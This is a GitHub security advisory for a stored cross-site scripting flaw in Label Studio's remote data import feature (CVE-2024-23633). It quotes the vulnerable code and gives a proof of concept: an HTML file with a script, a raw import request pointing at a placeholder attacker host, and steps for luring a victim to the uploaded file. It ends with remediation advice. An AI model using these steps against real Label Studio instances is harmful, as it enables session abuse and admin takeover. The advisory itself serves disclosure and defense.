# [M] Cross-site Scripting Vulnerability on Data Import

## Summary
Severity: Medium
Advisory: GHSA-fq23-g58m-799r
CVE: CVE-2024-23633
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2024-01-24
Source: https://github.com/advisories/GHSA-fq23-g58m-799r
Type: github-advisory

## Affected
- PyPI: `label-studio` — affected >=0 <1.10.1

## Details
# Introduction

This write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.

# Overview

[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.

# Description

The following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.

```python
def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):
    """Download file using URL and read tasks from it"""
    # process URL with tasks
    try:
        filename = url.rsplit('/', 1)[-1] <1>

        response = ssrf_safe_get(
            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}
        )
        file_content = response.content
        check_tasks_max_file_size(int(response.headers['content-length']))
        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))
        if file_upload.format_could_be_tasks_list:
            could_be_tasks_list = True
        file_upload_ids.append(file_upload.id)
        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)

    except ValidationError as e:
        raise e
    except Exception as e:
        raise ValidationError(str(e))
    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list
```
1. The file name that was set was retrieved from the URL.

The downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.

```python
class UploadedFileResponse(generics.RetrieveAPIView):
    permission_classes = (IsAuthenticated,)

    @swagger_auto_schema(auto_schema=None)
    def get(self, *args, **kwargs):
        request = self.request
        filename = kwargs['filename']
        # XXX needed, on windows os.path.join generates '\' which breaks FileUpload
        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename
        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')
        file_upload = FileUpload.objects.filter(file=file).last()

        if not file_upload.has_permission(request.user):
            return Response(status=status.HTTP_403_FORBIDDEN)

        file = file_upload.file
        if file.storage.exists(file.name):
            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>
            content_type = content_type or 'application/octet-stream'
            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)
        else:
            return Response(status=status.HTTP_404_NOT_FOUND)
```
1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.

Since the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.

# Proof of Concept

Below were the steps to recreate this issue:

1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.

```html
<html>
    <body>
        <h1>Data Import XSS</h1>
        <script>
            alert(document.domain);
        </script>
    </body>
</html>
```

2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).

```http
POST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1
Host: {victim_host}
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close
Cookie: {cookies}
Pragma: no-cache
Cache-Control: no-cache

url=https://{evil_site}/xss.html
```

3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.

4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.

![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)

# Impact

Executing arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.

# Remediation Advice

* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).
* Restrict the allowed file extensions that could be downloaded.

# Discovered
- August 2023, Alex Brown, elttam

## References
- https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r
- https://nvd.nist.gov/vuln/detail/CVE-2024-23633
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox
- https://github.com/HumanSignal/label-studio
- https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62
- https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146
- https://github.com/pypa/advisory-database/tree/main/vulns/label-studio/PYSEC-2024-128.yaml
